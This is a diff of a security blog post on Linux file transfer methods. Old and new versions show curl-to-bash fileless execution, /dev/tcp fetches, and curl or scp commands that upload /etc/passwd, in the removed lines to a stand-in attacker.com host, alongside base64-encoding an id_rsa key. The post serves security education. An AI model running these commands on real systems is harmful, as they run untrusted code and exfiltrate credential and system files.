@@ -1,88 +1,89 @@
 ---
 title: "Linux File Transfer Methods"
-date: 2025-03-16 12:00:00 +0000
-categories: [Linux, Security]
-tags: [File Transfer, Offensive Security, Incident Response]
-description: "Exploring various methods to transfer files in Linux, from traditional tools to fileless techniques."
-#image: "/assets/images/linux-file-transfer.png"
+date: 2025-03-16
+tags: [Linux, File Transfer, Security]
+categories: [Cybersecurity, Linux]
+pinned: false
 ---
 
-## Introduction
+## Overview
+Linux provides various methods for transferring files, essential for both attackers and defenders in cybersecurity. Understanding these methods helps in securing systems and preventing unauthorized file transfers.
 
-Understanding file transfer methods in Linux is crucial for both attackers and defenders. Threat actors often exploit various transfer techniques to deploy malware, while security professionals use them to detect and mitigate attacks.
+## Common File Transfer Methods
+### 1. **Base64 Encoding/Decoding**
+Used for transferring files without network communication. Encode files into a Base64 string, transfer via terminal, and decode on the target machine.
 
-This post explores multiple ways to transfer files in Linux, including network-based and fileless methods.
-
-## **Common File Transfer Techniques**
-
-### **1. Base64 Encoding/Decoding**
-If network access is restricted, files can be encoded in Base64, copied as text, and then decoded on the target machine.
 ```bash
-# Encode a file
-cat id_rsa | base64 -w 0
+# Encode
+cat file.txt | base64 -w 0; echo
 
-# Decode the file on the target machine
-echo 'encoded_string' | base64 -d > id_rsa
+# Decode
+echo -n 'encoded_string' | base64 -d > file.txt
 ```
 
-### **2. Web-Based Downloads**
-Using `wget` and `curl`, files can be fetched from a remote server:
+### 2. **Web Downloads with Wget and cURL**
+Two widely used utilities for downloading files from the web.
+
 ```bash
 # Using wget
-wget https://example.com/file.sh -O /tmp/file.sh
+download_url="https://example.com/file.sh"
+wget -O /tmp/file.sh $download_url
 
 # Using curl
-curl -o /tmp/file.sh https://example.com/file.sh
-```
-For fileless execution, commands can be piped:
-```bash
-curl https://example.com/script.sh | bash
+curl -o /tmp/file.sh $download_url
 ```
 
-### **3. Bash `/dev/tcp` Transfers**
-If common tools are unavailable, Bash can be used to fetch files via raw TCP connections:
+### 3. **Fileless Attacks**
+Execute scripts directly without saving to disk.
+
 ```bash
+# Execute script directly from URL
+curl https://example.com/script.sh | bash
+wget -qO- https://example.com/script.py | python3
+```
+
+### 4. **Bash (/dev/tcp) Download**
+Useful when no traditional tools are available.
+
+```bash
+# Establish connection
 exec 3<>/dev/tcp/target_ip/80
+# Request file
 echo -e "GET /file.sh HTTP/1.1\n\n" >&3
+# Read response
 cat <&3
 ```
 
-### **4. SSH & SCP Transfers**
-Using SSH, files can be securely transferred between systems:
+### 5. **SSH-Based Transfers**
+Securely transfer files between systems using SCP.
+
 ```bash
-# Download a file from a remote machine
+# Download file from remote server
 scp user@remote:/path/to/file .
 
-# Upload a file to a remote machine
-scp file.txt user@remote:/home/user/
+# Upload file to remote server
+scp file.txt user@remote:/path/to/destination
 ```
 
-### **5. Python, PHP, and Ruby Web Servers**
-If a compromised machine has Python, PHP, or Ruby, a quick web server can be started:
+## Upload Operations
+### 1. **Web Uploads with Curl**
+Upload files using HTTP POST requests.
+
 ```bash
-# Python 3 Web Server
+curl -X POST https://server/upload -F 'file=@/etc/passwd' --insecure
+```
+
+### 2. **Hosting a Temporary Web Server**
+Start a simple web server for file transfer.
+
+```bash
+# Python 3
 python3 -m http.server 8000
 
-# PHP Web Server
+# PHP
 php -S 0.0.0.0:8000
 ```
-The file can then be retrieved from another machine:
-```bash
-wget http://target_ip:8000/file.txt
-```
 
-## **Upload Operations**
-For exfiltrating files from a target, `curl` can be used to upload via a malicious server:
-```bash
-curl -X POST https://attacker.com/upload -F 'file=@/etc/passwd' --insecure
-```
-Alternatively, `scp` can be used:
-```bash
-scp /etc/passwd user@attacker:/tmp/
-```
-
-## **Conclusion**
-Understanding Linux file transfer techniques is essential for security professionals. Whether downloading, uploading, or performing fileless execution, knowing these methods enhances both attack and defense strategies.
-
-Stay informed and practice ethical security techniques to protect your systems!
+## Conclusion
+Understanding Linux file transfer methods is crucial for cybersecurity professionals. Attackers leverage these techniques for infiltration, while defenders must monitor and mitigate risks effectively.
 
